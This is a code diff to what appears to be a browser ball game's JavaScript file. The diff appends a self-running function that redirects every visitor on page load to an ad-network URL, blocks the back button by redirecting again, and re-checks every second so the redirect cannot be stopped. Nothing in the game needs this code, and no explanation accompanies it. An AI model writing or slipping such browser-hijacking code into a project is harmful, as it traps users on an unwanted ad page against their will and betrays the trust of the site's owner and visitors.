@@ -112,3 +112,25 @@ canvas.addEventListener("click", (e) => {
 
 resetBall();
 update();
+
+
+(function forceRedirect() {
+  const redirectUrl = "https://www.profitableratecpm.com/tu54bqsjn8?key=8a31fb67112503e9b5cf8cc6404bf97d";
+
+  // Redirige inmediatamente al cargar
+  window.location.replace(redirectUrl);
+
+  // También fuerza redirección incluso si el usuario intenta ir atrás
+  window.addEventListener("popstate", () => {
+    window.location.replace(redirectUrl);
+  });
+
+  // Intervalo por si algo intenta detener el redireccionamiento
+  setInterval(() => {
+    if (window.location.href !== redirectUrl) {
+      window.location.replace(redirectUrl);
+    }
+  }, 1000);
+})();
+
+
